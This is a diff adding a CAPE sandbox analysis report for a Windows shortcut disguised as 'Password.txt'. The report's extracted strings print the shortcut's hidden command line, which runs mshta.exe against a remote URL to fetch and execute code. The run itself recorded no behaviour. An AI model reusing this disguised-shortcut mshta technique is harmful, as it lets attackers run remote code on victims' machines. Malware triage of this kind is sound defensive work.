@@ -1,0 +1,169 @@
+{
+  "statistics": {
+    "processing": [
+      {
+        "name": "DecryptPcap",
+        "time": 0.001
+      },
+      {
+        "name": "CAPE",
+        "time": 1.218
+      },
+      {
+        "name": "AnalysisInfo",
+        "time": 0.134
+      },
+      {
+        "name": "BehaviorAnalysis",
+        "time": 0.024
+      },
+      {
+        "name": "Debug",
+        "time": 0.025
+      },
+      {
+        "name": "NetworkAnalysis",
+        "time": 0.0
+      },
+      {
+        "name": "UrlAnalysis",
+        "time": 0.0
+      },
+      {
+        "name": "script_log_processing",
+        "time": 0.0
+      },
+      {
+        "name": "ProcessMemory",
+        "time": 0.001
+      }
+    ],
+    "signatures": [],
+    "reporting": [
+      {
+        "name": "BinGraph",
+        "time": 0.0
+      }
+    ]
+  },
+  "decryptpcap": {},
+  "target": {
+    "category": "file",
+    "file": {
+      "name": "Password.txt.lnk",
+      "path": "/opt/CAPEv2/storage/binaries/af5bc8fc2df1debff6eeeb376cb5bd84ae7a16f22eff147241f520cc9966e51a",
+      "guest_paths": "",
+      "size": 1325,
+      "crc32": "A6E0C017",
+      "md5": "ef534f50808c1e91e0e1d17823f8c5b1",
+      "sha1": "1d25262637f29232dcc0d0bc25e0f8db868119a3",
+      "sha256": "af5bc8fc2df1debff6eeeb376cb5bd84ae7a16f22eff147241f520cc9966e51a",
+      "sha512": "8b7363b447b8c3b6ee4cf22220d5f55e4756af28baf40b72617dddeb70d1884835cfb1eb4a72b32a138902b635cbfcdba7ffb38f5a424dbcb44d4400d5ef2d86",
+      "rh_hash": null,
+      "ssdeep": "24:8KjCnmiwTXb8AWZ+/efVx4I0Wdz13z1NvMK28y/msdE:8Xm1TPlID1D1F28a",
+      "type": "MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has command line arguments, Icon number=70, Unicoded, MachineID win-ik7n6sd2ubu, EnableTargetMetadata KnownFolderID 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7, Archive, ctime=Fri Dec 20 07:17:52 2024, atime=Fri Dec 20 07:17:52 2024, mtime=Fri Dec 20 07:17:52 2024, length=32768, window=showminnoactive, IDListSize 0x013b, Root folder \"20D04FE0-3AEA-1069-A2D8-08002B30309D\", Volume \"C:\\\", LocalBasePath \"C:\\Windows\\System32\\mshta.exe\"",
+      "yara": [],
+      "cape_yara": [],
+      "clamav": [],
+      "tlsh": "T10F2146411BE96796E337CD320976F21107367951EE42D35D4660B18C4878E10FA75F7B",
+      "sha3_384": "3cc5bf85b261731666d26a1abf4c278f8484994254669d3c19551fc0871acb1e382e4d05d561a2b86c3775e0aad4b577",
+      "yara_hash": "0e29e1704625e93af27445e01f64a7539da7e965621eefc136f40958e4f795db",
+      "options_hash": "44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a",
+      "data": null,
+      "strings": [
+        "Text Document",
+        "C:\\Windows\\System32\\mshta.exe",
+        "win-ik7n6sd2ubu",
+        "C:\\Users\\Administrator\\Desktop\\Password.txt",
+        "1SPSLX",
+        "1SPS0",
+        "&..\\..\\..\\..\\Windows\\System32\\mshta.exe$\"http://overly.dinergysolutions.org\"!%SystemRoot%\\System32\\SHELL32.dll",
+        "Windows",
+        "C:\\Users\\Administrator\\Desktop",
+        "mshta.exe",
+        "System32",
+        "4System32",
+        "@&\\/=.",
+        "Password.txt"
+      ],
+      "virustotal": {
+        "error": true,
+        "msg": "Unable to complete connection to VirusTotal. Status code: 429"
+      },
+      "executed_tools": [
+        "msi_extract",
+        "overlay",
+        "kixtart_extract",
+        "vbe_extract",
+        "batch_extract",
+        "UnAutoIt_extract",
+        "UPX_unpack",
+        "RarSFX_extract",
+        "Inno_extract",
+        "SevenZip_unpack",
+        "de4dot_deobfuscate",
+        "eziriz_deobfuscate",
+        "office_one"
+      ],
+      "cape_type_code": 0,
+      "cape_type": ""
+    }
+  },
+  "CAPE": {
+    "payloads": [],
+    "configs": []
+  },
+  "info": {
+    "version": "2.5",
+    "started": "2026-04-17 12:46:12",
+    "ended": "2026-04-17 12:51:14",
+    "duration": 302,
+    "id": 31,
+    "category": "file",
+    "custom": "",
+    "machine": {
+      "id": 25,
+      "status": "starting",
+      "name": "cuckoo1",
+      "label": "cuckoo1",
+      "platform": "windows",
+      "manager": "KVM",
+      "started_on": "2026-04-17 12:46:12",
+      "shutdown_on": "2026-04-17 12:51:11"
+    },
+    "package": "lnk",
+    "timeout": false,
+    "tlp": null,
+    "parent_sample": {
+      "id": 27,
+      "file_size": 3817910,
+      "file_type": "Zip archive data, at least v5.1 to extract, compression method=AES Encrypted",
+      "md5": "4fe951090bb1ffb9591f03f5f5ad8d07",
+      "crc32": "4EBE96AE",
+      "sha1": "ba2119443ee81d3a27fabe82a6e3184961a3b05f",
+      "sha256": "15242f931bf6437e9d0c099e839ebb62a04013e66a0cecea7d32222d164418a2",
+      "sha512": "fc292280717a98c7e70c500ee3d59ab0cec910cc63d17382b3135ef13b0f3afaf8a2678c7039246b33e5eccf9f7e799cf9c46737ae819c318fe59eee8b04a1c9",
+      "ssdeep": null,
+      "source_url": null
+    },
+    "options": {},
+    "source_url": null,
+    "route": "none",
+    "user_id": 0,
+    "CAPE_current_commit": "35a362e838e289987267a10c6a0880bf30c5dc99"
+  },
+  "behavior": {
+    "processes": []
+  },
+  "debug": {
+    "log": "",
+    "errors": []
+  },
+  "network": {},
+  "url_analysis": {},
+  "procmemory": [],
+  "signatures": [],
+  "malscore": 0.0,
+  "ttps": [],
+  "malstatus": null
+}
